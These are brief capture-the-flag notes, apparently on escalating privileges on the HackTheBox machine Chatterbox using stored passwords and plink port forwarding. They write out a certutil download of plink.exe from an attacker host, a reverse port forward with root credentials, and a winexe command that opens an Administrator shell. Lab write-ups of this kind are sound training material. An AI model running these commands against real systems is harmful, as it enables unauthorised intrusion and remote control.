# Escalation Path: Passwords and Port Forwarding

### Overview

HTB Chatterbox - write up here: https://github.com/lukepatterson31/htb/tree/main/machines/chatterbox/chatterbox.md

sushant747 first quarter of the doc can help, hints to plink

### Gaining a Foothold

Use the exploit-db buffer overflow exploit (non-metasploit)

### Escalation via Stored Passwords

Box seems to differ from current state, 445 isn't visible with an nmap scan

Use plink to port forward 445 (part of PuTTy) - https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html

Upload plink.exe to the target by hosting a python http server on the attacking machine, then use certutil on 
the target to download the exe

`certutil -urlcache -f http://10.10.10.2/plink.exe plink.exe`

Edit /etc/ssh/sshd_config to PermitRootLogin then restart the ssh service

Create a port forward on the target with the attacker's root user and password

`plink.exe -l root -pw toor -R 445:127.0.0.1:445 10.10.10.2`

Use winexe to execute commands on a Windows system from a linux system

`winexe -U Administrator%Welcome1! //127.0.0.1 "cmd.exe"`
